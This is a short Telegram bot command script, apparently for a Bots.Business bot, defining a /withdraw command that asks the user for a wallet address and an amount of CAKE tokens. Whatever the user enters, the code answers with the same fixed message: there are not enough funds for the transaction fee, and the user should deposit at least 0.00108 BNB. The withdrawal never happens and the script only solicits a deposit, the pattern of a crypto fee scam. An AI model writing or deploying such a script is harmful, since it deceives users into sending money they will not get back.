/*CMD
  command: /withdraw
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER
Please enter address and amount with currency to withdraw
Example: 0x5ED5ac6765ed7E4FA86991A72E6023BF7cb13bac 1 CAKE

Enter address to withdraw:
  ANSWER
  keyboard: 📜Menu
  aliases: 💵withdraw
CMD*/

Bot.sendMessage("❌Not enough funds for transaction fee \nPlease deposit at least 0.00108 BNB to your wallet");
